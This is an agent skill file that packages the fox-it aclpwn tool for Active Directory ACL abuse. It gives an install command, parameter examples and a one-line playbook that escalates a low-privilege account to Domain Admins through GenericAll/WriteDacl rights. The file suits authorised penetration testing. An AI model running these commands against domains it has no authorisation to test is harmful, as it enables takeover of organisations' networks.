---
name: aclpwn-acl-abuse
description: "aclpwn: automates ACL abuse. Signals: ad attack, domain pentest, ACL privilege escalation path"
zh-signals: "aclpwn: ACL 滥用自动化。信号:ad攻击,域渗透,ACL 提权路径。"
when-to-use: >-
  Use during Active Directory privilege escalation when you have valid
  credentials or BloodHound data and want to compute and execute ACL abuse paths
  to a target principal.
---

# aclpwn

- Attack Category: C30 AD Domain Penetration and Domain Controller Attacks
- Upstream Repository: https://github.com/fox-it/aclpwn.py
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install aclpwn
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `aclpwn -f svc -t 'domain admins' -d corp.local` | ACL privilege escalation path |
| `-f user -t target -cp` | BloodHound data |
| `-d domain -u u -p p` | Credentials |

## Attack Scenario Playbook

### Automated ACL abuse

```bash
aclpwn -f lowpriv -t 'domain admins' -d corp.local -du dc01
# GenericAll/WriteDacl automatic privilege escalation
```

## Notes

By fox-it; automates ACL attack paths.
